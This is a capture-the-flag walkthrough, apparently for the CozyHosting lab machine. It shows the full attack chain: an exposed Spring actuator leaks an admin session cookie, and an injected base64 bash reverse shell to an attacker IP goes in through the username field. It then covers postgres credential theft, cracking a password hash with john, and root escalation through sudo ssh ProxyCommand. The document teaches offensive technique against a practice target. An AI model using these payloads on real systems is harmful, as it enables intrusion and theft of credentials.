Nothing found with ffuf, but we found something with dirsearch

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/CozyHosting-10.10.11.230]
└─$ dirsearch -u http://cozyhosting.htb

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                             
                                                                                                                    
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/cozyhosting.htb/_23-10-05_19-37-16.txt

Error Log: /home/kali/.dirsearch/logs/errors-23-10-05_19-37-16.log

Target: http://cozyhosting.htb/

[19:37:16] Starting: 
[19:37:27] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
[19:37:31] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[19:37:32] 400 -  435B  - /a%5c.aspx                                        
[19:37:33] 200 -    5KB - /actuator/env                                     
[19:37:33] 200 -   15B  - /actuator/health                                  
[19:37:33] 200 -  634B  - /actuator                                         
[19:37:33] 200 -  148B  - /actuator/sessions                                
[19:37:33] 200 -   10KB - /actuator/mappings                                
[19:37:34] 200 -  124KB - /actuator/beans                                   
[19:37:34] 401 -   97B  - /admin                                            
[19:37:58] 200 -    0B  - /engine/classes/swfupload//swfupload.swf          
[19:37:58] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf       
[19:37:59] 500 -   73B  - /error                                            
[19:37:59] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
[19:38:00] 200 -    0B  - /extjs/resources//charts.swf                      
[19:38:03] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf            
[19:38:05] 200 -   12KB - /index                                            
[19:38:10] 200 -    4KB - /login                                            
[19:38:10] 200 -    0B  - /login.wdm%2e                                     
[19:38:11] 204 -    0B  - /logout                                           
[19:38:27] 400 -  435B  - /servlet/%C0%AE%C0%AE%C0%AF                       
                                                                             
Task Completed
```

We found the webapp actuator

![[Pasted image 20231005200656.png]]

And under sessions service we can steal the admin cookie

![[Pasted image 20231005200733.png]]

Changing our cookie and accessing to http://cozyhosting.htb/admin we access to the admin panel. Here we have something that points to a ssh connection indicating the endpoint and user. Trying payloads we found the user field vulnerable, but we can use whitespaces. Using the `${IFS}` variable to introduce a blank space and encoding the payload to base64 we got a shell

```bash
┌──(kali㉿kali)-[~]
└─$ echo 'bash -i >& /dev/tcp/10.10.14.22/1234 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi8xMjM0IDA+JjEK

Hostname: 10.10.14.22
Username: ;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi8xMjM0IDA+JjEK"|base64${IFS}-d|bash;

---------------------

┌──(kali㉿kali)-[~/Documents/Boxes/CozyHosting-10.10.11.230]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.11.230] 36162
bash: cannot set terminal process group (1062): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ whoami
whoami
app
```

As app user we cannot view the user flag, so we execute `linpeas` and `pspy` to check where to proceed. We find some interesting things (like kanderson:MRdEQuv6~6P9 credentials) but nothing to move on. 

In the app folder we found a jar file. After move it to our machine we unzip the jar and we found the postgres credentials

![[Pasted image 20231006124021.png]]

So we can connect to postgres now

```bash
app@cozyhosting:/app$ psql "postgresql://postgres:Vg&nvzAQ7XxR@localhost"    
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)

postgres=# \l
WARNING: terminal is not fully functional
Press RETURN to continue 
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privil
eges   
-------------+----------+----------+-------------+-------------+----------------
-------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |

postgres=# \c cozyhosting
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".

cozyhosting=# \d 
              List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres

cozyhosting=# SELECT * FROM users;
WARNING: terminal is not fully functional
Press RETURN to continue 
   name    |                           password                           | role
  
-----------+--------------------------------------------------------------+-----
--
 kanderson| $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin    | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
 ```

We have retrieve the hash for the admin user, lets try to crack it

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/CozyHosting-10.10.11.230]
└─$ vim admin.hash

┌──(kali㉿kali)-[~/Documents/Boxes/CozyHosting-10.10.11.230]
└─$ john -w=/usr/share/wordlists/rockyou.txt admin.hash 
Using default input encoding: UTF-8
manchesterunited (?)
```

And we have the password manchesterunited

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/CozyHosting-10.10.11.230]
└─$ ssh root@10.10.11.230               
Password: manchesterunited
Permission denied, please try again.

┌──(kali㉿kali)-[~/Documents/Boxes/CozyHosting-10.10.11.230]
└─$ ssh josh@10.10.11.230
Password: manchesterunited
josh@cozyhosting:~$ whoami
josh
```

And we have move laterally as josh with the credentials josh:manchesterunited

As we have the josh password, first we execute `sudo -l`

```bash
josh@cozyhosting:~$ sudo -l
User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

And checking **[GTFOBins for ssh](https://gtfobins.github.io/gtfobins/ssh/#sudo)** we can spawn a root shell

```bash
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# whoami
root
```